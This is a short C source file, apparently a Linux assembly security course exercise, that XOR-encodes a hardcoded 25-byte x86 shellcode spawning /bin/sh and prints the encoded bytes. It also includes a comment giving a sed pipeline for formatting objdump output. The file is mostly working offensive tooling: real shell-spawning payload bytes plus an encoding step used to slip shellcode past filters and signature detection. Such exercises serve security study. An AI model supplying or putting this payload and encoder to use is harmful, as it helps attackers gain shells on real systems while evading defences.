/*
 * Author:		Paolo Stivanin <https://github.com/polslinux>
 * Description:	Encode a shellcode using XOR
 * Tested on:	Gentoo x86/x86-64, Ubuntu 14.04 x86/amd64
 * SLAE ID:		526
 * 
 */

#include <stdio.h>

/* Inside the array sc[] you have to put the result of the following cmd:
 * echo SHELLCODE-FORMAT-OBJDUMP |sed 's/x//g'| sed 's/\(..\)/0x\1,/g'
 */

#define LEN 25 //this is the lenght of the shellcode

int main(void){
	int i;
	int encByte[1] = {0xAA}; //this is the byte using to encode the shellcode
	int sc[] = {0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80};
	int encoded_sc[LEN];
	for(i=0;i<LEN;i++){
		encoded_sc[i] = sc[i]^encByte[0];
	}

	char encoded_sc_human_readable[LEN*5] = {0};
	for(i=0;i<LEN;i++){
		sprintf(encoded_sc_human_readable+(i*5), "0x%02x," ,encoded_sc[i]);
	}
	encoded_sc_human_readable[LEN*5-1] = '\0';
	printf("%s\n", encoded_sc_human_readable);

	return 0;
}
